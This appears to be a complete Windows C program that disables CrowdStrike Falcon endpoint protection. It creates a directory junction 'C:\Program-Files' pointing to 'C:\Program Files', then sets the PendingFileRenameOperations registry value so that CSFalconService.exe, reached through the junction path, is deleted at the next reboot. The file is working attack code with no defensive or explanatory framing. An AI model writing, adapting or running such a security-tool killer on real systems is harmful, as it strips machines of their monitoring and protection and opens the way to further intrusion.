#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

typedef struct _REPARSE_DATA_BUFFER
{
    ULONG ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct
        {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct
        {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct
        {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

BOOL create_junction(LPCWSTR junction_dir, LPCWSTR target_dir) {
    HANDLE file = CreateFileW(junction_dir, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return FALSE;

    WCHAR substitute_name[MAX_PATH], print_name[MAX_PATH];
    swprintf_s(substitute_name, MAX_PATH, L"\\??\\%s", target_dir);
    wcscpy_s(print_name, MAX_PATH, target_dir);

    USHORT substitute_name_len = (USHORT)(wcslen(substitute_name) * sizeof(WCHAR));
    USHORT print_name_len = (USHORT)(wcslen(print_name) * sizeof(WCHAR));
    USHORT reparse_data_size = (USHORT)(FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer)
        + substitute_name_len + sizeof(WCHAR) + print_name_len + sizeof(WCHAR));

    PREPARSE_DATA_BUFFER buf = (PREPARSE_DATA_BUFFER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reparse_data_size);
    if (!buf) {
        CloseHandle(file);
        return FALSE;
    }

    buf->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    buf->ReparseDataLength = (USHORT)(reparse_data_size - REPARSE_DATA_BUFFER_HEADER_LENGTH);
    buf->MountPointReparseBuffer.SubstituteNameOffset = 0;
    buf->MountPointReparseBuffer.SubstituteNameLength = substitute_name_len;
    buf->MountPointReparseBuffer.PrintNameOffset = substitute_name_len + sizeof(WCHAR);
    buf->MountPointReparseBuffer.PrintNameLength = print_name_len;

    memcpy(buf->MountPointReparseBuffer.PathBuffer, substitute_name, substitute_name_len);
    buf->MountPointReparseBuffer.PathBuffer[substitute_name_len / sizeof(WCHAR)] = L'\0';
    memcpy((PBYTE)buf->MountPointReparseBuffer.PathBuffer + substitute_name_len + sizeof(WCHAR), print_name, print_name_len);
    buf->MountPointReparseBuffer.PathBuffer[(substitute_name_len + sizeof(WCHAR) + print_name_len) / sizeof(WCHAR)] = L'\0';

    BOOL success = DeviceIoControl(file, FSCTL_SET_REPARSE_POINT, buf, reparse_data_size, NULL, 0, NULL, NULL);

    HeapFree(GetProcessHeap(), 0, buf);
    CloseHandle(file);
    
    return success;
}

BOOL setup_junction() {
    LPCWSTR junction_dir = L"C:\\Program-Files";
    LPCWSTR target_dir = L"C:\\Program Files";

    if (!CreateDirectoryW(junction_dir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
        return FALSE;

    return create_junction(junction_dir, target_dir);
}

BOOL set_registry_value(LPCWSTR sub_key, LPCWSTR reg_key, const WCHAR* const* values) {
    HKEY key;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, sub_key, 0, KEY_SET_VALUE, &key);
    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    size_t total_len = 0;
    for (const WCHAR* const* p = values; *p != NULL; p++) {
        total_len += wcslen(*p) + 1;
    }
    total_len += 1;

    WCHAR* multi_sz_val = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total_len * sizeof(WCHAR));
    if (!multi_sz_val) {
        RegCloseKey(key);
        return FALSE;
    }

    WCHAR* ptr = multi_sz_val;
    for (const WCHAR* const* p = values; *p != NULL; p++) {
        size_t len = wcslen(*p);
        memcpy(ptr, *p, len * sizeof(WCHAR));
        ptr += len;
        *ptr++ = L'\0';
    }
    *ptr = L'\0';

    result = RegSetValueExW(key, reg_key, 0, REG_MULTI_SZ, (BYTE*)multi_sz_val, (DWORD)(total_len * sizeof(WCHAR)));

    HeapFree(GetProcessHeap(), 0, multi_sz_val);
    RegCloseKey(key);

	return result == ERROR_SUCCESS;
}

int main() {
    if (!setup_junction()) {
        return FALSE;
    }
	wprintf(L"Junction created successfully.\n");

    LPCWSTR sub_key = L"SYSTEM\\CurrentControlSet\\Control\\Session Manager";
    const WCHAR* ops[] = {
        L"\\??\\C:\\program-files\\CrowdStrike\\CSFalconService.exe",
        L"",
        L"",
        NULL
    };

    if (!set_registry_value(sub_key, L"PendingFileRenameOperations", ops)) {
        return 2;
    }
    wprintf(L"PendingFileRenameOperations set successfully.\n");
    
    return 0;
}
